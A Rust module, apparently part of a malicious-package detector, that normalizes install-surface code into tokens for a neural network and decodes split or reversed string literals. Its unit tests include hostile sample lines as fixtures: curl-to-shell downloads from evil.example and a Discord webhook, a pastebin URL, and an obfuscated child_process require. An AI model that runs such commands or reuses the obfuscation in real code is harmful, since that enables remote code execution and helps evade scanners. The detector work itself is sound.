//! Install-surface token stream for the code neural network.
//!
//! The Python training pipeline consumes this stream verbatim, so these rules are part of
//! the schema (bump `FEATURE_SCHEMA_VERSION` when changing them):
//!
//! 1. Files are visited in `install_surface` order. Each unit (a file, an npm script
//!    command, or inline `node -e` code) starts with the marker token `<file>`.
//! 2. Comments and Python logical-newline markers produce no tokens.
//! 3. Identifiers (Python, JavaScript) are lowercased: `Popen` becomes `popen`.
//! 4. String literals (and JavaScript regex literals) become `<str>`, except when the
//!    content is 1 to 24 bytes long and consists only of ASCII letters, digits and
//!    `_ - . : / @`, in which case the lowercased content is kept without quotes:
//!    `'child_process'` becomes `child_process`, `"discord.com"` stays `discord.com`.
//!    Template literal chunks around `${...}` are separate strings. Literals joined by `+`
//!    (or written side by side in Python) count as one, folded as the indicator rules
//!    fold them, so `('child_' + 'process')` also becomes `child_process`. Escapes that
//!    spell characters by number are decoded first, and a literal reversed at run time
//!    (`'...'[::-1]`, `'...'.split('').reverse().join('')`) is read forwards.
//! 5. Numbers become `<num>`.
//! 6. Punctuation is kept verbatim, with multi-character operators as single tokens
//!    (`==`, `=>`, `**`, `...`, `?.`).
//! 7. Shell words (npm script commands, `.sh`/`.bat`/`.ps1`/`.cmd` files) follow the string
//!    rule (4); shell operators (`|`, `&&`, `;`, `>`) are punctuation.
//! 8. The stream is truncated at `max_tokens` (default 4096) tokens in total.

use crate::indicators::fold_runs;
use crate::lexer::{
    decoded_strings, joined_literals, lex, reversed_literals, with_decoded, with_reversed, Lang,
    TokKind,
};

pub const FILE_MARKER: &str = "<file>";
pub const STR_TOKEN: &str = "<str>";
pub const NUM_TOKEN: &str = "<num>";

fn keep_string(s: &str) -> bool {
    !s.is_empty()
        && s.len() <= 24
        && s.bytes().all(|b| {
            b.is_ascii_alphanumeric() || matches!(b, b'_' | b'-' | b'.' | b':' | b'/' | b'@')
        })
}

fn norm_string(s: &str) -> String {
    if keep_string(s) {
        s.to_ascii_lowercase()
    } else {
        STR_TOKEN.to_string()
    }
}

/// Append the normalized tokens of one install-surface unit, respecting the overall cap.
pub fn push_unit_tokens(out: &mut Vec<String>, text: &str, lang: Lang, max_tokens: usize) {
    if out.len() >= max_tokens {
        return;
    }
    out.push(FILE_MARKER.to_string());
    let raw = lex(text, lang);
    let decoded = decoded_strings(text, &raw, lang);
    let dec = with_decoded(&raw, &decoded);
    let revs = reversed_literals(&dec, lang);
    let unrev = with_reversed(&dec, &revs);
    let joins = joined_literals(&unrev, lang);
    let toks = with_reversed(&unrev, &joins);
    let runs = match lang {
        Lang::Shell => Vec::new(),
        _ => fold_runs(&toks, lang),
    };
    let mut runs = runs.iter().peekable();
    let mut i = 0;
    while i < toks.len() {
        if out.len() >= max_tokens {
            return;
        }
        if let Some((_, end, lits)) = runs.next_if(|r| r.0 == i) {
            let folded: String = lits.iter().map(|&l| toks[l].text).collect();
            out.push(norm_string(&folded));
            i = *end;
            continue;
        }
        let t = toks[i];
        i += 1;
        let tok = match t.kind {
            TokKind::Newline => continue,
            TokKind::Ident if lang == Lang::Shell => norm_string(t.text),
            TokKind::Ident => t.text.to_lowercase(),
            TokKind::Str | TokKind::Regex => norm_string(t.text),
            TokKind::Num => NUM_TOKEN.to_string(),
            TokKind::Punct => t.text.to_string(),
        };
        out.push(tok);
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn python_normalization() {
        let mut out = Vec::new();
        push_unit_tokens(
            &mut out,
            "import os  # comment\nos.system('curl https://evil.example/x | sh', 42)\nx = \"child_process\"\n",
            Lang::Python,
            4096,
        );
        assert_eq!(
            out,
            vec![
                "<file>",
                "import",
                "os",
                "os",
                ".",
                "system",
                "(",
                "<str>",
                ",",
                "<num>",
                ")",
                "x",
                "=",
                "child_process"
            ]
        );
    }

    #[test]
    fn split_literals_fold_into_one_token() {
        let mut out = Vec::new();
        push_unit_tokens(
            &mut out,
            "require(('child_' + 'process')) + 'a' + x;",
            Lang::Js,
            4096,
        );
        assert_eq!(
            out,
            vec![
                "<file>",
                "require",
                "(",
                "child_process",
                ")",
                "+",
                "a",
                "+",
                "x",
                ";"
            ]
        );
        let mut out = Vec::new();
        push_unit_tokens(
            &mut out,
            "u = ('https://' 'pastebin' '.com/raw/' + k)\n",
            Lang::Python,
            4096,
        );
        assert_eq!(out, vec!["<file>", "u", "=", "(", "<str>", "+", "k", ")"]);
        // Literals reversed at run time read forwards, then fold like any other literal.
        let mut out = Vec::new();
        push_unit_tokens(
            &mut out,
            "require('ssecorp'.split('').reverse().join('') + '_dlihc'[0]);",
            Lang::Js,
            4096,
        );
        assert_eq!(&out[..4], ["<file>", "require", "(", "process"]);
        let mut out = Vec::new();
        push_unit_tokens(&mut out, "m = 'ssec' 'orp'[::-1]\n", Lang::Python, 4096);
        assert_eq!(out, vec!["<file>", "m", "=", "process"]);
    }

    #[test]
    fn js_and_shell_normalization() {
        let mut out = Vec::new();
        push_unit_tokens(
            &mut out,
            "const CP = require('child_process'); x => y;",
            Lang::Js,
            4096,
        );
        assert_eq!(
            out,
            vec![
                "<file>",
                "const",
                "cp",
                "=",
                "require",
                "(",
                "child_process",
                ")",
                ";",
                "x",
                "=>",
                "y",
                ";"
            ]
        );
        let mut out = Vec::new();
        push_unit_tokens(
            &mut out,
            "curl -fsSL https://discord.com/api/webhooks/1/2 | sh",
            Lang::Shell,
            4096,
        );
        assert_eq!(out, vec!["<file>", "curl", "-fssl", "<str>", "|", "sh"]);
    }

    #[test]
    fn cap_is_respected() {
        let mut out = Vec::new();
        let src = "a + ".repeat(5000);
        push_unit_tokens(&mut out, &src, Lang::Js, 4096);
        assert_eq!(out.len(), 4096);
        push_unit_tokens(&mut out, "b", Lang::Js, 4096);
        assert_eq!(out.len(), 4096);
    }
}
